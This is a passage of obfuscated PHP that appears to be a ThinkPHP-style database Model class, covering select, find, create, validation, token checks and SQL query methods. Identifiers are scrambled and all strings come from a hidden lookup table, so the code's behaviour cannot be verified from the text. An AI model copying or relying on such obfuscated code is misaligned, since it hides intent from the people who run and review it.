else { $İš£âıÃ[$ÖôÜ˜] = $ÏÆ³ĞöË; } $this->options[$µŞŒ‚’÷[328]] = $İš£âıÃ; } $ÏÆ³ĞöË = $this->_parseOptions(); if (is_array($ÏÆ³ĞöË[$µŞŒ‚’÷[328]]) && isset($ÏÆ³ĞöË[$µŞŒ‚’÷[328]][$ÖôÜ˜])) { $èí‘”‘Ò = $ÏÆ³ĞöË[$µŞŒ‚’÷[328]][$ÖôÜ˜]; } $•’ìêÌÛ = $this->db->delete($ÏÆ³ĞöË); if (!1 !== $•’ìêÌÛ) { $µõ•‹Ó = array(); if (isset($èí‘”‘Ò)) { $µõ•‹Ó[$ÖôÜ˜] = $èí‘”‘Ò; } $this->_after_delete($µõ•‹Ó, $ÏÆ³ĞöË); } return $•’ìêÌÛ; } protected function _after_delete($Ö«æ¬€ , $ˆî•’) { } public function select($üÕ”—Î = array()) { $êÛÑÙ•¿ =& $_SERVER[‚ûòÉ˜ş]; if (is_string($üÕ”—Î) || is_numeric($üÕ”—Î)) { $•­âÖÊ÷ = $this->getPk(); if (strpos($üÕ”—Î, $êÛÑÙ•¿[60])) { $ûóÚê‹µ[$•­âÖÊ÷] = array($êÛÑÙ•¿[329], $üÕ”—Î); } else { $ûóÚê‹µ[$•­âÖÊ÷] = $üÕ”—Î; } $this->options[$êÛÑÙ•¿[328]] = $ûóÚê‹µ; } elseif (!1 === $üÕ”—Î) { $üÕ”—Î = $this->_parseOptions(); return $êÛÑÙ•¿[330] . $this->db->buildSelectSql($üÕ”—Î) . $êÛÑÙ•¿[331]; } $üÕ”—Î = $this->_parseOptions(); $¼ü‘òö· = $this->db->select($üÕ”—Î); if (!1 === $¼ü‘òö·) { return !1; } if (empty($¼ü‘òö·)) { return null; } $this->_afterSelect($¼ü‘òö·, $üÕ”—Î); return $¼ü‘òö·; } protected function _afterSelect(&$ç÷¥°Ÿ‘, $äØ¤¸·) { } public function buildSql($¨°îÙ¯— = array()) { $Ï š«şñ =& $_SERVER[‚ûòÉ˜ş]; $¨°îÙ¯— = $this->_parseOptions($¨°îÙ¯—); return $Ï š«şñ[330] . $this->db->buildSelectSql($¨°îÙ¯—) . $Ï š«şñ[331]; } public function optionsValue($˜°‘èÓ› = null) { if (is_null($˜°‘èÓ›)) { return $this->options; } elseif (is_array($˜°‘èÓ›)) { $this->options = array_merge($this->options, $˜°‘èÓ›); } } protected function _parseOptions($»ü®•ª = array()) { $ÑŒ“œ =& $_SERVER[‚ûòÉ˜ş]; if (is_array($»ü®•ª)) { $»ü®•ª = array_merge($this->options, $»ü®•ª); } $this->options = array(); if (!isset($»ü®•ª[$ÑŒ“œ[332]])) { $»ü®•ª[$ÑŒ“œ[332]] = $this->getTableName(); $µ¾ùÏÌè = $this->fields; } else { $µ¾ùÏÌè = $this->getDbFields(); } if (!empty($»ü®•ª[$ÑŒ“œ[333]])) { $»ü®•ª[$ÑŒ“œ[332]] .= $ÑŒ“œ[63] . $»ü®•ª[$ÑŒ“œ[333]]; } $»ü®•ª[$ÑŒ“œ[334]] = $this->name; if (isset($»ü®•ª[$ÑŒ“œ[328]]) && is_array($»ü®•ª[$ÑŒ“œ[328]]) && !empty($µ¾ùÏÌè) && !isset($»ü®•ª[$ÑŒ“œ[335]]) && !isset($»ü®•ª[$ÑŒ“œ[332]])) { foreach ($»ü®•ª[$ÑŒ“œ[328]] as $¸‰¥´ş¹ => $¯‡õ—©¹) { $¸‰¥´ş¹ = trim($¸‰¥´ş¹); if (in_array($¸‰¥´ş¹, $µ¾ùÏÌè, !0)) { if (is_scalar($¯‡õ—©¹)) { $this->_parseType($»ü®•ª[$ÑŒ“œ[328]], $¸‰¥´ş¹); } } elseif (!is_numeric($¸‰¥´ş¹) && $ÑŒ“œ[11] != substr($¸‰¥´ş¹, 0, 1) && !1 === strpos($¸‰¥´ş¹, $ÑŒ“œ[10]) && !1 === strpos($¸‰¥´ş¹, $ÑŒ“œ[313]) && !1 === strpos($¸‰¥´ş¹, $ÑŒ“œ[336]) && !1 === strpos($¸‰¥´ş¹, $ÑŒ“œ[337])) { unset($»ü®•ª[$ÑŒ“œ[328]][$¸‰¥´ş¹]); } } } $this->_options_filter($»ü®•ª); return $»ü®•ª; } protected function _options_filter(&$ÓÂ®ûÑù) { } protected function _parseType(&$ÇıÜÑ¦ï, $ÌÓğ­Â‰) { $ÖğÈàÛ· =& $_SERVER[‚ûòÉ˜ş]; if (empty($this->options[$ÖğÈàÛ·[338]][$ÖğÈàÛ·[4] . $ÌÓğ­Â‰])) { $…óâ˜µ = strtolower($this->fields[$ÖğÈàÛ·[305]][$ÌÓğ­Â‰]); if (!1 !== strpos($…óâ˜µ, $ÖğÈàÛ·[339])) { } elseif (!1 === strpos($…óâ˜µ, $ÖğÈàÛ·[340]) && !1 !== strpos($…óâ˜µ, $ÖğÈàÛ·[341])) { $ÇıÜÑ¦ï[$ÌÓğ­Â‰] = intval($ÇıÜÑ¦ï[$ÌÓğ­Â‰]); } elseif (!1 !== strpos($…óâ˜µ, $ÖğÈàÛ·[342]) || !1 !== strpos($…óâ˜µ, $ÖğÈàÛ·[343])) { $ÇıÜÑ¦ï[$ÌÓğ­Â‰] = floatval($ÇıÜÑ¦ï[$ÌÓğ­Â‰]); } elseif (!1 !== strpos($…óâ˜µ, $ÖğÈàÛ·[344])) { $ÇıÜÑ¦ï[$ÌÓğ­Â‰] = (bool) $ÇıÜÑ¦ï[$ÌÓğ­Â‰]; } } } public function find($“¾×½¿ = array()) { $¾ÔĞÍûñ =& $_SERVER[‚ûòÉ˜ş]; if (is_numeric($“¾×½¿) || is_string($“¾×½¿)) { $Ö¤ÁĞ‹˜[$this->getPk()] = intval($“¾×½¿); $this->options[$¾ÔĞÍûñ[328]] = $Ö¤ÁĞ‹˜; } $this->options[$¾ÔĞÍûñ[345]] = 1; $“¾×½¿ = $this->_parseOptions(); $ÖñÍ¨î‹ = $this->db->select($“¾×½¿); if (!1 === $ÖñÍ¨î‹) { return !1; } if (empty($ÖñÍ¨î‹)) { return null; } $this->data = $ÖñÍ¨î‹[0]; $this->_afterFind($this->data, $“¾×½¿); if (!empty($this->options[$¾ÔĞÍûñ[346]])) { return $this->returnResult($this->data, $this->options[$¾ÔĞÍûñ[346]]); } return $this->data; } protected function _afterFind(&$¢¬€¡Ë», $ß§Óñßö) { } protected function returnResult($ğ¥‘©¿, $°„»©ß× = '') { $„¢à’¦£ =& $_SERVER[‚ûòÉ˜ş]; if ($°„»©ß×) { if (is_callable($°„»©ß×)) { return call_user_func($°„»©ß×, $ğ¥‘©¿); } switch (strtolower($°„»©ß×)) { case $„¢à’¦£[347]: return json_encode($ğ¥‘©¿); case $„¢à’¦£[348]: return xml_encode($ğ¥‘©¿); } } return $ğ¥‘©¿; } public function parseFieldsMap($àÁÅ‘‘ó, $ºÖª½‹³ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $à–¹ÉÃ® => $©Ä­ìøÖ) { if ($ºÖª½‹³ == 1) { if (isset($àÁÅ‘‘ó[$©Ä­ìøÖ])) { $àÁÅ‘‘ó[$à–¹ÉÃ®] = $àÁÅ‘‘ó[$©Ä­ìøÖ]; unset($àÁÅ‘‘ó[$©Ä­ìøÖ]); } } else { if (isset($àÁÅ‘‘ó[$à–¹ÉÃ®])) { $àÁÅ‘‘ó[$©Ä­ìøÖ] = $àÁÅ‘‘ó[$à–¹ÉÃ®]; unset($àÁÅ‘‘ó[$à–¹ÉÃ®]); } } } } return $àÁÅ‘‘ó; } public function setField($­¾³¾ç–, $‹áÄ”‚Ş = '') { if (is_array($­¾³¾ç–)) { $ÊşˆèŠ = $­¾³¾ç–; } else { $ÊşˆèŠ[$­¾³¾ç–] = $‹áÄ”‚Ş; } return $this->save($ÊşˆèŠ); } public function setAdd($Ü‘çÈ”, $Åˆ¢Å³é = 1) { $Ò·–çÜ´ =& $_SERVER[‚ûòÉ˜ş]; $—îæáàé = $Ü‘çÈ” . $Ò·–çÜ´[349] . $Åˆ¢Å³é; if ($Åˆ¢Å³é < 0) { $—îæáàé = $Ü‘çÈ” . $Åˆ¢Å³é; } return $this->setField($Ü‘çÈ”, array($Ò·–çÜ´[350], $—îæáàé)); } public function getField($“ë¨ºò›, $š…™ø = null) { $÷Ò—²‡ò =& $_SERVER[‚ûòÉ˜ş]; $ËòÚ€Òš[$÷Ò—²‡ò[326]] = $“ë¨ºò›; $ËòÚ€Òš = $this->_parseOptions($ËòÚ€Òš); $“ë¨ºò› = trim($“ë¨ºò›); if (strpos($“ë¨ºò›, $÷Ò—²‡ò[60])) { if (!isset($ËòÚ€Òš[$÷Ò—²‡ò[345]])) { $ËòÚ€Òš[$÷Ò—²‡ò[345]] = is_numeric($š…™ø) ? $š…™ø : $÷Ò—²‡ò[12]; } $¹µîÌúÌ = $this->db->select($ËòÚ€Òš); if (!empty($¹µîÌúÌ)) { $¢×»±´Â = explode($÷Ò—²‡ò[60], $“ë¨ºò›); $“ë¨ºò› = array_keys($¹µîÌúÌ[0]); $ğŠ“†Ëò = array_shift($“ë¨ºò›); $êÕ¨öĞş = array_shift($“ë¨ºò›); $¾ú  û = array(); $Òîû«£ç = count($¢×»±´Â); foreach ($¹µîÌúÌ as $˜«Æ„…©) { $Èìã®Ä = $˜«Æ„…©[$ğŠ“†Ëò]; if (2 == $Òîû«£ç) { $¾ú  û[$Èìã®Ä] = $˜«Æ„…©[$êÕ¨öĞş]; } else { $¾ú  û[$Èìã®Ä] = is_string($š…™ø) ? implode($š…™ø, $˜«Æ„…©) : $˜«Æ„…©; } } return $¾ú  û; } } else { if (!0 !== $š…™ø) { $ËòÚ€Òš[$÷Ò—²‡ò[345]] = is_numeric($š…™ø) ? $š…™ø : 1; } if ($š…™ø === $÷Ò—²‡ò[308]) { unset($ËòÚ€Òš[$÷Ò—²‡ò[345]]); } $˜«Æ„…© = $this->db->select($ËòÚ€Òš); if (!empty($˜«Æ„…©)) { if ($š…™ø === $÷Ò—²‡ò[308]) { return reset($˜«Æ„…©[0]); } if (!0 !== $š…™ø && 1 == $ËòÚ€Òš[$÷Ò—²‡ò[345]]) { return reset($˜«Æ„…©[0]); } foreach ($˜«Æ„…© as $¬³âû°Ë) { $úæğÖµÒ[] = $¬³âû°Ë[$“ë¨ºò›]; } return $úæğÖµÒ; } } return null; } public function create($©Ğôİ”½ = '', $Ì™…ŸôÇ = '') { $İ‚”ÛÌ =& $_SERVER[‚ûòÉ˜ş]; if (empty($©Ğôİ”½)) { $©Ğôİ”½ = $_POST; } elseif (is_object($©Ğôİ”½)) { $©Ğôİ”½ = get_object_vars($©Ğôİ”½); } if (empty($©Ğôİ”½) || !is_array($©Ğôİ”½)) { $this->error = think_lang($İ‚”ÛÌ[324]); return !1; } $©Ğôİ”½ = $this->parseFieldsMap($©Ğôİ”½, 0); $Ì™…ŸôÇ = $Ì™…ŸôÇ ? $Ì™…ŸôÇ : (!empty($©Ğôİ”½[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$İ‚”ÛÌ[326]])) { $Ë¯³”¿ = $this->options[$İ‚”ÛÌ[326]]; unset($this->options[$İ‚”ÛÌ[326]]); } elseif ($Ì™…ŸôÇ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Ë¯³”¿ = $this->insertFields; } elseif ($Ì™…ŸôÇ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Ë¯³”¿ = $this->updateFields; } if (isset($Ë¯³”¿)) { if (is_string($Ë¯³”¿)) { $Ë¯³”¿ = explode($İ‚”ÛÌ[60], $Ë¯³”¿); } if (think_config($İ‚”ÛÌ[351])) { $Ë¯³”¿[] = think_config($İ‚”ÛÌ[352]); } foreach ($©Ğôİ”½ as $îëÏ½û => $øï“€¾) { if (!in_array($îëÏ½û, $Ë¯³”¿)) { unset($©Ğôİ”½[$îëÏ½û]); } } } if (!$this->autoValidation($©Ğôİ”½, $Ì™…ŸôÇ)) { return !1; } if (!$this->autoCheckToken($©Ğôİ”½)) { $this->error = think_lang($İ‚”ÛÌ[353]); return !1; } if ($this->autoCheckFields) { $Ë¯³”¿ = $this->getDbFields(); foreach ($©Ğôİ”½ as $îëÏ½û => $øï“€¾) { if (!in_array($îëÏ½û, $Ë¯³”¿)) { unset($©Ğôİ”½[$îëÏ½û]); } elseif (MAGIC_QUOTES_GPC && is_string($øï“€¾)) { $©Ğôİ”½[$îëÏ½û] = stripslashes($øï“€¾); } } } $this->autoOperation($©Ğôİ”½, $Ì™…ŸôÇ); $this->data = $©Ğôİ”½; return $©Ğôİ”½; } public function autoCheckToken($¶®íÂ»Ì) { $Ó•ôìÜã =& $_SERVER[‚ûòÉ˜ş]; if (isset($this->options[$Ó•ôìÜã[354]]) && !$this->options[$Ó•ôìÜã[354]]) { return !0; } if (think_config($Ó•ôìÜã[351])) { $Ê—¤¬ = think_config($Ó•ôìÜã[352]); if (!isset($¶®íÂ»Ì[$Ê—¤¬]) || Session::get($Ê—¤¬)) { return !1; } list($·Ï†¶“¼, $çüå¥›) = explode($Ó•ôìÜã[11], $¶®íÂ»Ì[$Ê—¤¬]); if ($çüå¥› && Session::get($Ê—¤¬ . $Ó•ôìÜã[10] . $·Ï†¶“¼) === $çüå¥›) { Session::remove($Ê—¤¬ . $Ó•ôìÜã[10] . $·Ï†¶“¼); return !0; } if (think_config($Ó•ôìÜã[355])) { Session::remove($Ê—¤¬ . $Ó•ôìÜã[10] . $·Ï†¶“¼); } return !1; } return !0; } public function regex($½ˆÓô‡, $ª±´ÏÊ) { $âùÆ¦€ø =& $_SERVER[‚ûòÉ˜ş]; $«¼•Ğ• = array($âùÆ¦€ø[356] => $âùÆ¦€ø[357], $âùÆ¦€ø[358] => $âùÆ¦€ø[359], $âùÆ¦€ø[360] => $âùÆ¦€ø[361], $âùÆ¦€ø[362] => $âùÆ¦€ø[363], $âùÆ¦€ø[364] => $âùÆ¦€ø[365], $âùÆ¦€ø[366] => $âùÆ¦€ø[367], $âùÆ¦€ø[368] => $âùÆ¦€ø[369], $âùÆ¦€ø[343] => $âùÆ¦€ø[370], $âùÆ¦€ø[371] => $âùÆ¦€ø[372]); if (isset($«¼•Ğ•[strtolower($ª±´ÏÊ)])) { $ª±´ÏÊ = $«¼•Ğ•[strtolower($ª±´ÏÊ)]; } return preg_match($ª±´ÏÊ, $½ˆÓô‡) === 1; } private function autoOperation(&$õÑÑÛÙÁ, $ÎüÙø¨ï) { $ç¤¢ºúÔ =& $_SERVER[‚ûòÉ˜ş]; if (!empty($this->options[$ç¤¢ºúÔ[373]])) { $îçìÇ’¼ = $this->options[$ç¤¢ºúÔ[373]]; unset($this->options[$ç¤¢ºúÔ[373]]); } elseif (!empty($this->_auto)) { $îçìÇ’¼ = $this->_auto; } if (isset($îçìÇ’¼)) { foreach ($îçìÇ’¼ as $é ±¡±Í) { if (empty($é ±¡±Í[2])) { $é ±¡±Í[2] = THINK_MODEL_INSERT; } if ($ÎüÙø¨ï == $é ±¡±Í[2] || $é ±¡±Í[2] == THINK_MODEL_BOTH) { switch (trim($é ±¡±Í[3])) { case $ç¤¢ºúÔ[374]: case $ç¤¢ºúÔ[375]: $­«ÇõÒ¿ = isset($é ±¡±Í[4]) ? (array) $é ±¡±Í[4] : array(); if (isset($õÑÑÛÙÁ[$é ±¡±Í[0]])) { array_unshift($­«ÇõÒ¿, $õÑÑÛÙÁ[$é ±¡±Í[0]]); } if ($ç¤¢ºúÔ[374] == $é ±¡±Í[3]) { $õÑÑÛÙÁ[$é ±¡±Í[0]] = call_user_func_array($é ±¡±Í[1], $­«ÇõÒ¿); } else { $õÑÑÛÙÁ[$é ±¡±Í[0]] = call_user_func_array(array(&$this, $é ±¡±Í[1]), $­«ÇõÒ¿); } break; case $ç¤¢ºúÔ[326]: $õÑÑÛÙÁ[$é ±¡±Í[0]] = $õÑÑÛÙÁ[$é ±¡±Í[1]]; break; case $ç¤¢ºúÔ[376]: if ($ç¤¢ºúÔ[12] === $õÑÑÛÙÁ[$é ±¡±Í[0]]) { unset($õÑÑÛÙÁ[$é ±¡±Í[0]]); } break; case $ç¤¢ºúÔ[377]: default: $õÑÑÛÙÁ[$é ±¡±Í[0]] = $é ±¡±Í[1]; } if (!1 === $õÑÑÛÙÁ[$é ±¡±Í[0]]) { unset($õÑÑÛÙÁ[$é ±¡±Í[0]]); } } } } return $õÑÑÛÙÁ; } protected function autoValidation($Á‚ÊŒ‹, $óî†¸) { $»ëÁö =& $_SERVER[‚ûòÉ˜ş]; if (!empty($this->options[$»ëÁö[378]])) { $âè¹¹õ = $this->options[$»ëÁö[378]]; unset($this->options[$»ëÁö[378]]); } elseif (!empty($this->_validate)) { $âè¹¹õ = $this->_validate; } if (isset($âè¹¹õ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($âè¹¹õ as $Ìí¬§Ó => $å¡éìÊ») { if (empty($å¡éìÊ»[5]) || $å¡éìÊ»[5] == THINK_MODEL_BOTH || $å¡éìÊ»[5] == $óî†¸) { if (0 == strpos($å¡éìÊ»[2], $»ëÁö[379]) && strpos($å¡éìÊ»[2], $»ëÁö[380])) { $å¡éìÊ»[2] = think_lang(substr($å¡éìÊ»[2], 2, -1)); } $å¡éìÊ»[3] = isset($å¡éìÊ»[3]) ? $å¡éìÊ»[3] : THINK_EXISTS_VALIDATE; $å¡éìÊ»[4] = isset($å¡éìÊ»[4]) ? $å¡éìÊ»[4] : $»ëÁö[381]; switch ($å¡éìÊ»[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Á‚ÊŒ‹, $å¡éìÊ»)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($»ëÁö[12] != trim($Á‚ÊŒ‹[$å¡éìÊ»[0]])) { if (!1 === $this->_validationField($Á‚ÊŒ‹, $å¡éìÊ»)) { return !1; } } break; default: if (isset($Á‚ÊŒ‹[$å¡éìÊ»[0]])) { if (!1 === $this->_validationField($Á‚ÊŒ‹, $å¡éìÊ»)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ÑÃÀ¶ïÇ, $ÃÏÙÏ û) { if (!1 === $this->_validationFieldItem($ÑÃÀ¶ïÇ, $ÃÏÙÏ û)) { if ($this->patchValidate) { $this->error[$ÃÏÙÏ û[0]] = $ÃÏÙÏ û[2]; } else { $this->error = $ÃÏÙÏ û[2]; return !1; } } return; } protected function _validationFieldItem($ÙŸ¿¹’Ù, $—‡÷„Ÿ) { $ÜùÁÎ¶ =& $_SERVER[‚ûòÉ˜ş]; switch (strtolower(trim($—‡÷„Ÿ[4]))) { case $ÜùÁÎ¶[374]: case $ÜùÁÎ¶[375]: $¯¾İö•Ü = isset($—‡÷„Ÿ[6]) ? (array) $—‡÷„Ÿ[6] : array(); if (is_string($—‡÷„Ÿ[0]) && strpos($—‡÷„Ÿ[0], $ÜùÁÎ¶[60])) { $—‡÷„Ÿ[0] = explode($ÜùÁÎ¶[60], $—‡÷„Ÿ[0]); } if (is_array($—‡÷„Ÿ[0])) { foreach ($—‡÷„Ÿ[0] as $Ù­´İÑ) { $´µì÷Êò[$Ù­´İÑ] = $ÙŸ¿¹’Ù[$Ù­´İÑ]; } array_unshift($¯¾İö•Ü, $´µì÷Êò); } else { array_unshift($¯¾İö•Ü, $ÙŸ¿¹’Ù[$—‡÷„Ÿ[0]]); } if ($ÜùÁÎ¶[374] == $—‡÷„Ÿ[4]) { return call_user_func_array($—‡÷„Ÿ[1], $¯¾İö•Ü); } else { return call_user_func_array(array(&$this, $—‡÷„Ÿ[1]), $¯¾İö•Ü); } case $ÜùÁÎ¶[382]: return $ÙŸ¿¹’Ù[$—‡÷„Ÿ[0]] == $ÙŸ¿¹’Ù[$—‡÷„Ÿ[1]]; case $ÜùÁÎ¶[383]: if (is_string($—‡÷„Ÿ[0]) && strpos($—‡÷„Ÿ[0], $ÜùÁÎ¶[60])) { $—‡÷„Ÿ[0] = explode($ÜùÁÎ¶[60], $—‡÷„Ÿ[0]); } $ê–ä„Öá = array(); if (is_array($—‡÷„Ÿ[0])) { foreach ($—‡÷„Ÿ[0] as $Ù­´İÑ) { $ê–ä„Öá[$Ù­´İÑ] = $ÙŸ¿¹’Ù[$Ù­´İÑ]; } } else { $ê–ä„Öá[$—‡÷„Ÿ[0]] = $ÙŸ¿¹’Ù[$—‡÷„Ÿ[0]]; } if (!empty($ÙŸ¿¹’Ù[$this->getPk()])) { $ê–ä„Öá[$this->getPk()] = array($ÜùÁÎ¶[384], $ÙŸ¿¹’Ù[$this->getPk()]); } if ($this->where($ê–ä„Öá)->find()) { return !1; } return !0; default: return $this->check($ÙŸ¿¹’Ù[$—‡÷„Ÿ[0]], $—‡÷„Ÿ[1], $—‡÷„Ÿ[4]); } } public function check($×ÍáÖ‰, $ğ€¶Ÿ¾†, $ÈÑñ§² = "\x72\x65\x67\145\x78") { $ïü¥²Æç =& $_SERVER[‚ûòÉ˜ş]; $ÈÑñ§² = strtolower(trim($ÈÑñ§²)); switch ($ÈÑñ§²) { case $ïü¥²Æç[7]: case $ïü¥²Æç[385]: $¡İÅÌ…Â = is_array($ğ€¶Ÿ¾†) ? $ğ€¶Ÿ¾† : explode($ïü¥²Æç[60], $ğ€¶Ÿ¾†); return $ÈÑñ§² == $ïü¥²Æç[7] ? in_array($×ÍáÖ‰, $¡İÅÌ…Â) : !in_array($×ÍáÖ‰, $¡İÅÌ…Â); case $ïü¥²Æç[386]: case $ïü¥²Æç[387]: if (is_array($ğ€¶Ÿ¾†)) { $‘ˆøÆŒñ = $ğ€¶Ÿ¾†[0]; $äŸªß¼« = $ğ€¶Ÿ¾†[1]; } else { list($‘ˆøÆŒñ, $äŸªß¼«) = explode($ïü¥²Æç[60], $ğ€¶Ÿ¾†); } return $ÈÑñ§² == $ïü¥²Æç[386] ? $×ÍáÖ‰ >= $‘ˆøÆŒñ && $×ÍáÖ‰ <= $äŸªß¼« : $×ÍáÖ‰ < $‘ˆøÆŒñ || $×ÍáÖ‰ > $äŸªß¼«; case $ïü¥²Æç[388]: case $ïü¥²Æç[389]: return $ÈÑñ§² == $ïü¥²Æç[388] ? $×ÍáÖ‰ == $ğ€¶Ÿ¾† : $×ÍáÖ‰ != $ğ€¶Ÿ¾†; case $ïü¥²Æç[390]: $¤ù¹Ûøœ = mb_strlen($×ÍáÖ‰, $ïü¥²Æç[391]); if (strpos($ğ€¶Ÿ¾†, $ïü¥²Æç[60])) { list($‘ˆøÆŒñ, $äŸªß¼«) = explode($ïü¥²Æç[60], $ğ€¶Ÿ¾†); return $¤ù¹Ûøœ >= $‘ˆøÆŒñ && $¤ù¹Ûøœ <= $äŸªß¼«; } else { return $¤ù¹Ûøœ == $ğ€¶Ÿ¾†; } case $ïü¥²Æç[392]: list($Ü“’±¶Å, $Û¨±Ù¾) = explode($ïü¥²Æç[60], $ğ€¶Ÿ¾†); if (!is_numeric($Ü“’±¶Å)) { $Ü“’±¶Å = strtotime($Ü“’±¶Å); } if (!is_numeric($Û¨±Ù¾)) { $Û¨±Ù¾ = strtotime($Û¨±Ù¾); } return NOW_TIME >= $Ü“’±¶Å && NOW_TIME <= $Û¨±Ù¾; case $ïü¥²Æç[393]: return in_array(get_client_ip(), explode($ïü¥²Æç[60], $ğ€¶Ÿ¾†)); case $ïü¥²Æç[394]: return !in_array(get_client_ip(), explode($ïü¥²Æç[60], $ğ€¶Ÿ¾†)); case $ïü¥²Æç[381]: default: return $this->regex($×ÍáÖ‰, $ğ€¶Ÿ¾†); } } public function query($´³Ç³’, $¾³«â‹‘ = false) { $Üà³«¥¨ =& $_SERVER[‚ûòÉ˜ş]; if (!is_bool($¾³«â‹‘) && !is_array($¾³«â‹‘)) { $¾³«â‹‘ = func_get_args(); array_shift($¾³«â‹‘); } $´³Ç³’ = str_replace(array($Üà³«¥¨[18], $Üà³«¥¨[395]), $Üà³«¥¨[63], $´³Ç³’); $´³Ç³’ = $this->parseSql($´³Ç³’, $¾³«â‹‘); return $this->db->query($´³Ç³’); } public function execute($ïÚ‹ñÀ£, $…˜’óÙø = false) { if (!is_bool($…˜’óÙø) && !is_array($…˜’óÙø)) { $…˜’óÙø = func_get_args(); array_shift($…˜’óÙø); } $ïÚ‹ñÀ£ = $this->parseSql($ïÚ‹ñÀ£, $…˜’óÙø); return $this->db->execute($ïÚ‹ñÀ£); } protected function parseSql($‚Áè¤Ò¦, $ş¸éìÃ) { $Ğé°³˜ =& $_SERVER[‚ûòÉ˜ş]; if (!0 === $ş¸éìÃ) { $áßèº = $this->_parseOptions(); $‚Áè¤Ò¦ = $this->db->parseSql($‚Áè¤Ò¦, $áßèº); } elseif (is_array($ş¸éìÃ)) { $ş¸éìÃ = array_map(array($this->db, $Ğé°³˜[396]), $ş¸éìÃ); $‚Áè¤Ò¦ = vsprintf($‚Áè¤Ò¦, $ş¸éìÃ); } else { $‚Áè¤Ò¦ = strtr($‚Áè¤Ò¦, array($Ğé°³˜[397] => $this->getTableName(), $Ğé°³˜[398] => think_config($Ğé°³˜[297]))); } $this->db->setModel($this->name); return $‚Áè¤Ò¦; } public function db($Ú“ÇÛØÙ = '', $‚²„¥²“ = '', $ë¿˜¶ = array()) { $ŞÉä‹£ =& $_SERVER[‚ûòÉ˜ş]; if ($ŞÉä‹£[12] === $Ú“ÇÛØÙ && $this->db) { return $this->db; } static $ÈŒÏÕèû = array(); static $ŒØ›©˜Ò = array(); if (!isset($ŒØ›©˜Ò[$Ú“ÇÛØÙ]) || isset($ŒØ›©˜Ò[$Ú“ÇÛØÙ]) && $‚²„¥²“ && $ÈŒÏÕèû[$Ú“ÇÛØÙ] != $‚²„¥²“) { if (!empty($‚²„¥²“) && is_string($‚²„¥²“) && !1 === strpos($‚²„¥²“, $ŞÉä‹£[8])) { $‚²„¥²“ = think_config($‚²„¥²“); } $Ú“ÇÛØÙ = think_guid($‚²„¥²“); $ŒØ›©˜Ò[$Ú“ÇÛØÙ] = Db::getInstance($‚²„¥²“); } elseif (NULL === $‚²„¥²“) { $ŒØ›©˜Ò[$Ú“ÇÛØÙ]->close(); unset($ŒØ›©˜Ò[$Ú“ÇÛØÙ]); return; } if (!empty($ë¿˜¶)) { if (is_string($ë¿˜¶)) { parse_str($ë¿˜¶, $ë¿˜¶); } foreach ($ë¿˜¶ as $„÷¼şã“ => $©éÓ°óÑ) { $this->setProperty($„÷¼şã“, $©éÓ°óÑ); } } $ÈŒÏÕèû[$Ú“ÇÛØÙ] = $‚²„¥²“; $this->db = $ŒØ›©˜Ò[$Ú“ÇÛØÙ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $‚ŞÕÇâé = get_class($this); if ($‚ŞÕÇâé == $_SERVER[‚ûòÉ˜ş][399]) { return $this->name; } $this->name = substr($‚ŞÕÇâé, 0, -5); } return $this->name; } public function getTableName() { $¤ñ‰¹Õ =& $_SERVER[‚ûòÉ˜ş]; if (empty($this->trueTableName)) { $¨§½š¶Ï = !empty($this->tablePrefix) ? $this->tablePrefix : $¤ñ‰¹Õ[12]; if (!empty($this->tableName)) { $¨§½š¶Ï .= $this->tableName; } else { $¨§½š¶Ï .= think_parse_name($this->name); } $this->trueTableName = strtolower($¨§½š¶Ï); } return (!empty($this->dbName) ? $this->dbName . $¤ñ‰¹Õ[10] : $¤ñ‰¹Õ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ì¤Ò˜ª» =& $_SERVER[‚ûòÉ˜ş]; return isset($this->fields[$ì¤Ò˜ª»[304]]) ? $this->fields[$ì¤Ò˜ª»[304]] : $this->pk; } public function getDbFields() { $‘ÜÄÈÎ³ =& $_SERVER[‚ûòÉ˜ş]; if (isset($this->options[$‘ÜÄÈÎ³[332]])) { $ÄÕÅôİ = $this->db->getFields($this->options[$‘ÜÄÈÎ³[332]]); return $ÄÕÅôİ ? array_keys($ÄÕÅôİ) : !1; } if ($this->fields) { $ÄÕÅôİ = $this->fields; unset($ÄÕÅôİ[$‘ÜÄÈÎ³[303]], $ÄÕÅôİ[$‘ÜÄÈÎ³[304]], $ÄÕÅôİ[$‘ÜÄÈÎ³[305]], $ÄÕÅôİ[$‘ÜÄÈÎ³[302]]); return $ÄÕÅôİ; } return !1; } public function data($İÎƒ’šô = '') { $úÄÌÈ¢¥ =& $_SERVER[‚ûòÉ˜ş]; if ($úÄÌÈ¢¥[12] === $İÎƒ’šô && !empty($this->data)) { return $this->data; } if (is_object($İÎƒ’šô)) { $İÎƒ’šô = get_object_vars($İÎƒ’šô); } elseif (is_string($İÎƒ’šô)) { parse_str($İÎƒ’šô, $İÎƒ’šô); } elseif (!is_array($İÎƒ’šô)) { think_exception(think_lang($úÄÌÈ¢¥[324])); } $this->data = $İÎƒ’šô; return $this; } public function join($ç¡î¤®) { $ÔĞÇªÔØ =& $_SERVER[‚ûòÉ˜ş]; if (is_array($ç¡î¤®)) { $this->options[$ÔĞÇªÔØ[335]] = $ç¡î¤®; } elseif (!empty($ç¡î¤®)) { $this->options[$ÔĞÇªÔØ[335]][] = $ç¡î¤®; } return $this; } public function union($½÷¦™¬Ò, $ù¥òšš£ = false) { $ç„ùâé‘ =& $_SERVER[‚ûòÉ˜ş]; if (empty($½÷¦™¬Ò)) { return $this; } if ($ù¥òšš£) { $this->options[$ç„ùâé‘[400]][$ç„ùâé‘[401]] = !0; } if (is_object($½÷¦™¬Ò)) { 